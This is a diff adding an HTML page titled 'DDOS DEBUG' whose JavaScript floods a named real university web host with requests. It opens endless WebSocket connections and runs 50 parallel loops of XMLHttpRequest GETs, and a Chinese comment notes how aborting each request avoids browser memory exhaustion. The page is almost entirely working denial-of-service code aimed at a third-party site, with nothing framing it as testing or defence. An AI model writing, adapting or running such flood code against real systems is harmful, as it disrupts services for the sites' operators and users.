@@ -1,0 +1,59 @@
+<html lang="en">
+<head>
+    <title>DDOS DEBUG</title>
+</head>
+<body>
+    <input type="submit" value="WebSocket" style="margin-left:10px" onclick="while_loop_ws()"/>
+	<input type="submit" value=" C  O  R " style="margin-left:10px" onclick="do_it()"/>
+	<div id="result"></div>
+    <script>
+    var scan_counter = 0;
+	var victim_website = "cspo.zju.edu.cn";//"www.cs.zju.edu.cn";
+	var xhr = new XMLHttpRequest();
+	
+    function while_loop_ws()
+	{
+        try
+        {
+            ws = new WebSocket("ws://" + victim_website + ":80");
+			scan_counter = scan_counter+1;
+            setTimeout("while_loop_ws()",0);
+        }
+        catch(err)
+        {
+            document.getElementById('result').innerHTML += "<b>Scan stopped. Exception: " + err + "</b>";
+            return;
+        }
+		document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "</b>";
+	}
+	function while_loop_cor()
+	{
+        try
+        {
+			xhr.abort();//解决内存耗费的关键在这里。
+			scan_counter = scan_counter+1;
+			xhr = new XMLHttpRequest();
+			xhr.open('GET', "http://" + victim_website + ":80");
+			xhr.send();		
+			
+            setTimeout("while_loop_cor()",0);
+        }
+        catch(err)
+        {
+            document.getElementById('result').innerHTML += "<b>Scan stopped. Exception: " + err + "</b>";
+            return;
+        }
+		document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "</b>";
+	}
+    function do_it()
+	{
+		var i = 0;
+		while(i<50)
+		{
+			while_loop_cor();
+			i++;
+		}
+	}
+    </script>
+</body>
+</html>
